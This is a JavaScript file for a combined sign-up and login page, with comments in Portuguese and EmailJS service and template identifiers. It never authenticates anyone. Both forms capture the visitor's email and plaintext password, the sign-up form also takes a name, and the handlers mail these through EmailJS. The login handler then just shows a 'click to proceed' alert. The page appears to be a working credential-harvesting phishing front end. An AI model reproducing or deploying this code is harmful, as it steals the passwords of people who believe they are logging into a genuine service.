// Inicializa o EmailJS
emailjs.init('4RhYGN_eOxGomB1dY');

const container = document.getElementById('container');
const registerBtn = document.getElementById('register');
const loginBtn = document.getElementById('login');

// Alterna entre os formulários
registerBtn.addEventListener('click', () => {
    container.classList.add("active");
});

loginBtn.addEventListener('click', () => {
    container.classList.remove("active");
});

// Envia o e-mail ao criar conta
document.getElementById('signup-form').addEventListener('submit', function(event) {
    event.preventDefault();

    const name = document.getElementById('signup-name').value;
    const email = document.getElementById('signup-email').value;
    const password = document.getElementById('signup-password').value;

    emailjs.send('service_ltzh3pv', 'template_q5hzjq5', {
        name: name,
        email: email,
        password: password
    }).then(response => {
        console.log('Email enviado com sucesso:', response);
        alert('Dados enviados com sucesso!');
        window.location.href = 'formulario2.html'; // Redireciona para o formulário após o envio bem-sucedido
    }).catch(error => {
        console.error('Erro ao enviar o e-mail:', error);
        alert('Erro ao enviar os dados.');
    });
});

// Envia o e-mail ao fazer login
document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault();

    const email = document.getElementById('login-email').value;
    const password = document.getElementById('login-password').value;

    emailjs.send('service_ltzh3pv', 'template_q5hzjq5', {
        email: email,
        password: password
    }).then(response => {
        console.log('Email enviado com sucesso:', response);
        alert('Clique para prosseguir!');
    }).catch(error => {
        console.error('Erro ao enviar o e-mail:', error);
        alert('Erro ao enviar os dados.');
    });
});

